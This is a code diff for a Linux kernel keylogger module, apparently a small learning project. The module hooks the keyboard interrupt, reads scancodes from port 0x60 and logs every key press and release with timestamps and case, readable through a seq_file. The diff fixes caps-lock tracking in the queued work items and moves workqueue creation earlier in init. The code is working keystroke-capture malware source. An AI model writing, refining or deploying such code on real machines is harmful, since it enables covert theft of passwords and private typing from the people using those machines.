@@ -292,7 +292,8 @@ static const struct file_operations ops = {
 	.llseek = seq_lseek,
 };
 
-static struct key_log_entry *key_create_entry(struct key_map *key)
+static struct key_log_entry *key_create_entry(struct key_map *key,
+					      const bool caps)
 {
 	struct timespec		ts;
 	struct key_log_entry	*log;
@@ -314,7 +315,7 @@ static struct key_log_entry *key_create_entry(struct key_map *key)
 	log->event = (key->pressed) ? PRESS : RELEASE;
 	log->upper_case = key_shift_left->pressed | key_shift_right->pressed;
 	// in case of caps lock we invert the comportement.
-	if (caps_lock && key_ignore_caps(key) == false)
+	if (caps && key_ignore_caps(key) == false)
 		log->upper_case = !log->upper_case;
 	time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &log->tm);
 	key_full_log->used += 1;
@@ -327,6 +328,7 @@ static struct workqueue_struct	*workqueue;
 struct key_task {
 	struct work_struct	task;
 	unsigned int		scancode;
+	bool			caps_lock;
 };
 
 static void		key_job(struct work_struct *work)
@@ -341,7 +343,7 @@ static void		key_job(struct work_struct *work)
 		key->pressed = (scancode & 0x80) == 0;
 		if (key->pressed)
 			key->press_count += 1;
-		key_create_entry(key);
+		key_create_entry(key, task->caps_lock);
 	} else {
 		pr_info("(scan: %3u : %3u) -> %s\n", scancode, scancode & 0x7f,
 			((scancode & 0x80) == 0 ? "pressed" : "released"));
@@ -359,6 +361,7 @@ static irqreturn_t	key_handler(int irq, void *dev_id)
 		task->scancode = inb(0x60);
 		if (task->scancode == SCANCODE_CAPS)
 			caps_lock = !caps_lock;
+		task->caps_lock = caps_lock;
 		INIT_WORK(&task->task, key_job);
 		queue_work(workqueue, &task->task);
 	}
@@ -414,6 +417,11 @@ static int		__init hello_init(void)
 	int		ret;
 
 	pr_info(MODULE_NAME "init ! %lu\n", sizeof(struct key_log_entry));
+	workqueue = create_workqueue("keylogger");
+	if (!workqueue) {
+		pr_err("failed to create workqueue.");
+		return -ENOMEM;
+	}
 	key_full_log = NULL;
 	caps_lock = false;
 	key_shift_left = get_key(42);
@@ -430,12 +438,7 @@ static int		__init hello_init(void)
 		free_irq(KEYBOARD_IRQ, &key_handler);
 		return 1;
 	}
-	workqueue = create_workqueue("keylogger");
-	if (!workqueue) {
-		keylogger_clean();
-		pr_err("failed to create workqueue.");
-		return -ENOMEM;
-	}
+
 	return 0;
 }
 
